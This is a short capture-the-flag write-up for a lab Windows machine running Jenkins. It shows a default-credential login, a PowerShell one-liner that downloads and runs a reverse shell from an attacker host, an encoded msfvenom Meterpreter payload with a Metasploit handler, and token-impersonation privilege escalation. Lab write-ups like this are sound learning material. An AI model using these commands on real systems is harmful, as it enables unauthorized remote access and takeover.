IP: 10.10.61.138
3 ports open:
 - 80 http IIS 7.5
 - 3389 sql server
 - 8080 http Jetty 9.4.z-snapshot

Jetty has a robots.txt entry
which is just /
the webpage is a login for jenkins with deafult creds of admin:admin

when logged in you can write code as a batch command under project/configure
a reverse shell with powershell
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.57.102:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IP 10.4.57.102 -Port 9001
```
1. Set up python webserver to host payload
2. Set up netcat listener to catch the shell.

when on the box run whoami to find user then navigate to their desktop for the user flag.


meterpreter time
create a windows meterpreter reverse shell using msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.57.102 LPORT=9001 -f exe -o shell.exe
```
1. make payload in msfvenom
```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.57.102:8000/shell.exe','shell.exe')"
```
2. start a handler in metasploit.
```bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.4.57.102 set LPORT 9001 run
```
3. run from within the powershell session with Start-Process "shell.exe"

to priv esc.
1. load incognito
2. list_tokens -g
3. impersonate_token "BUILTIN\Administrator"
To have the permissions of the new account migrate the process to services.exe

Spawn a shell and locate the root.txt file.
